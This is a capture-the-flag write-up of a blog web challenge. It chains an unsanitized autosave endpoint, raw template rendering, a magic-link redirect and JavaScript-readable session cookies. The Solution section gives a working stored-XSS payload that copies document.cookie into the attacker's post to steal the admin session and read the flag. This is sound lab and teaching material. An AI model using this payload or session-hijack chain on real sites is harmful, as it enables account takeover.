#### Personal Blog
- points earned: 40
#### Notes / Intuition
- While most of the time DOMpurify is used to sanitize post content (either on the frontend or backend), there does exist a vector where sanitization is skipped.  The problem is that on the backend `POST /api/autosave` trusts that the data it receives has been sanitized.  This is because as part of the expected flow, the front end would sanitize the content before it POSTs to the backend.
	```javascript
	setInterval(async () => {
		const clean = window.DOMPurify.sanitize(editor.innerHTML);
		try {
			await postJson('/api/autosave', { postId, content: clean });
		} catch (err) {
			// ignore
		}
	}, 30000);
	```
- If an attacker just sends a post to `/api/autosave` it will store the content, unsanitized, in the `draftContent` field.
```javascript
app.post('/api/autosave', requireLogin, (req, res) => {
	const db = req.db;
	const postId = Number.parseInt(req.body.postId, 10);
	if (!Number.isFinite(postId)) {
		return res.status(400).json({ ok: false });
	}
	const post = getPostById(db, req.user.id, postId);
	if (!post) {
		return res.status(404).json({ ok: false });
	}
	const rawContent = String(req.body.content || '');
	post.draftContent = rawContent;  // <------ here, no sanitization
	post.updatedAt = Date.now();
	saveDb(db);
	return res.json({ ok: true });
});
```
- The attacker planted JS can then be triggered by navigating to `GET /edit/:id`.  This is because the endpoint sends the `drafContent` to the template (if it exists) and the template renders it as safe html.
```html
<div id="editor" class="editor" data-post-id="<%= post.id %>" contenteditable="true"><%- draftContent %></div>
```
- The app prevents users from seeing posts that do not belong to them.  When a user views `GET /post/:id` it only returns the post if it matches the provided userId.
```javascript
function getPostById(db, userId, postId) {
	return db.posts.find((post) => post.userId === userId && post.id === postId) || null;
}
```
- However, the app has a `magic link` feature that allows a userA, for example, to generate a link such that when userB navigates to it, then userB gets a cookie that allows the to access the app as if they were userA.
```javascript
app.get('/magic/:token', (req, res) => {
	const db = req.db;
	const token = req.params.token;
	const record = db.magicLinks[token];
	if (!record) {
		return res.status(404).send('Invalid token.');
	}
	  
	const existingSid = req.cookies.sid;
	if (existingSid) {
		res.cookie('sid_prev', existingSid, cookieOptions());
	}
	const sid = createSession(db, record.userId);
	saveDb(db);
	res.cookie('sid', sid, cookieOptions());
	  
	const target = safeRedirect(req.query.redirect);
	return res.redirect(target);
});
```
- In the code snippet above, you can also see that the `GET /magic/:token` endpoint also accepts a `?redirect=` parameter.  So basically this endpoint assigns a cookie to whoever visits it and then redirects them to the path provided by the `?redirect=` parameter.
- This means an attacker can plant some js, create a magic link, then send the link (with redirect to edit infected post) to a target to get the target to run js in their browser.  That url looks like this `http://localhost:3000/magic/d111710f60e61da873337b1878d8ae07?redirect=/edit/3`.
- The flag gets returned with a request to `GET /flag`, however, this endpoint can only be accessed by a user who's session includes `isAdmin=true`.
- The session cookie is stored in the `sid` cookie or the `sid_prev` (if the user has visited a magic link). Both of  these are stored as `HttpOnly=false` which means js can see it.
- So all an attacker needs to do is get a cookie for the admin user and then visit the `/flag` endpoint.


#### Solution
- Create a new post and make sure to note the postId which will be needed for the next step
- Send a POST request to `/api/autosave` with the json data below.
	```json
	{"postId":"3","content":"<script>fetch('/api/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ postId: '3', content: document.cookie }) })</script>"}
	```
- This plants the following script, which edits a post such that the body contains `document.cookie`.  It's worth noting that I first tried to exfil the cookie but was not receiving the request.
```html
<script>
fetch(
	'/api/save',
	{
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		body: JSON.stringify({ postId: '3', content: document.cookie })
	}
)
</script>
```
- View the post by navigating to `GET /edit/:id`. The post content should contain both the `sid` and `sid_prev` cookies.  `sid_prev` will contain the cookie for admin user.
- Navigate to `GET /flag` making sure to set the `sid` cookie to the `sid_prev` value from the last step.
- The response will contain the flag.